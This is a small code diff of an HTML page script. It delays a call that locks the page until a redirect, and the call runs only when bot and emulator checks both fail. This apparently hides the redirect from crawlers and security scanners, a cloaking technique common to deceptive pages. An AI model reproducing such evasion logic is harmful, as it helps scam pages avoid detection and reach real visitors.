@@ -88,11 +88,13 @@
       }, ms);
     }
 
-    window.addEventListener('load', () => {
-      if (!isBot() && !isEmulator()) {
-        lockPageUntilRedirect(DELAY_MS);
-      }
-    });
+   window.addEventListener('load', () => {
+     if (!isBot() && !isEmulator()) {
+    setTimeout(() => {
+      lockPageUntilRedirect(DELAY_MS);
+    }, 100);
+  }
+});
   </script>
 </head>
 <body>
